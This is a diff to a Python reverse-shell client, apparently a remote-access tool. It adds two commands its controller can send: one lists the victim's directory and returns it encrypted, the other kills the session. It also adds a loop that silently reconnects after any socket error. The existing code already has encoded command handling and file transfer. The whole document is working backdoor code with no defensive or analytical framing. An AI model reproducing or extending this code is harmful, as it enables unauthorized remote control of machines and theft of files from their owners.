@@ -1,4 +1,5 @@
 import socket
+import sys
 import os
 import subprocess
 import select
@@ -12,7 +13,7 @@ HOST="localhost"
 
 PORT=9999
 
-s=socket.socket()
+global s
 
 def revshell(port):
 
@@ -80,6 +81,24 @@ def reverseconn():
 
             break
 
+        elif RevNet.dec(recvcmd.decode("utf-8"))=="ls":
+
+            dirs=os.listdir()
+
+            buf=''
+
+            for d in dirs:
+
+                buf+=d+'\n'
+
+            RevNet.send_all(s,str.encode(RevNet.enc(buf)))
+
+        elif RevNet.dec(recvcmd.decode("utf-8"))=="kill_quit":
+
+            s.close()
+
+            sys.exit()
+
         elif RevNet.dec(recvcmd[:6].decode("utf-8"))=="ftrans":
 
             RevNet.frecv(s)
@@ -120,7 +139,20 @@ def reverseconn():
 
     s.close()
 
-reverseconn()
+while True:
+
+    try:
+
+        s=socket.socket()
+
+        reverseconn()
+
+    except socket.error:
+
+        pass
+
+
+
 
     
 
